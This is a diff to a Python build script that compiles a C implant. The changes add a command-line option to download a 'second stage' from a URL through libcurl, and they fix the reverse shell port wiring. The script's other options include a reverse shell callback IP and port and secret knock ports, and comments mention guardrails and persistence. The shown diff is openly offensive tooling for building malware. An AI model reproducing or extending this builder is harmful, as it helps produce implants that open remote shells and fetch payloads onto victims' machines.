@@ -15,7 +15,7 @@ import os.path as filesys
 # Execution Guardrails (if Required)
 # Persistence Mechanism (if Required)
 
-implant_c_path = "helper.h helper.c bind.c daemonize.c"
+implant_c_path = "../client/url2file.c"
 
 parser = argparse.ArgumentParser("python compiler.py", usage='%(prog)s [-o fileName] [-p listener] [-intfc eth0] [-act SECRET_PORTS] [-key 200,300,400] [-atkSc] [-a x64] [-p linux] [-ip 192.160.1.100] [-revip 192.168.2.132] [-revport 1337] [-strip]')
 
@@ -55,7 +55,9 @@ parser.add_argument("-atkR", "--reverseShell",action="store_true",
 parser.add_argument("-revip", "--reverseIP",type=str, metavar='',
         help="reverse shell callback IP")  
 parser.add_argument("-revport", "--reversePort",type=str, metavar='',
-        help="reverse shell Port")
+        help="reverse shell Port") 
+parser.add_argument("-url", "--downloadURL",type=str, metavar='',
+        help="url to get second stage downloaded (or lovely pictures of cookies)")
 
 """
 parser.add_argument("-vn", "--versionNumber",type=str, metavar='',
@@ -109,7 +111,7 @@ with open('log.csv', mode='a+') as log_file:
     log_writer.writerow([str(datetime.datetime.now()), str(args.ipAddress), str(args.architecture), str(args.os), str(args.outputName)])
 
 
-cmdString = ["gcc", implant_c_path, "-o", args.outputName]
+cmdString = ["gcc", implant_c_path, "-o", args.outputName, "-lcurl"]
 
 if args.debug:
     cmdString.insert(1, "-D DEBUG")
@@ -120,8 +122,11 @@ if args.ipAddress != "unknown":
     
 if args.reverseIP != "unknown":
     cmdString.insert(1, "-D REVIP=\"" +(args.reverseIP)+ "\"")
-if args.port != "unknown":
-    cmdString.insert(1, "-D PORT=\"" +(args.port)+ "\"")
+if args.reversePort != "unknown":
+    cmdString.insert(1, "-D PORT=\"" +(args.reversePort)+ "\"")
+
+if args.downloadURL != "unknown":
+    cmdString.insert(1, "-D URL=\"" +(args.downloadURL)+ "\"")
 
 
 if args.architecture != "unknown":
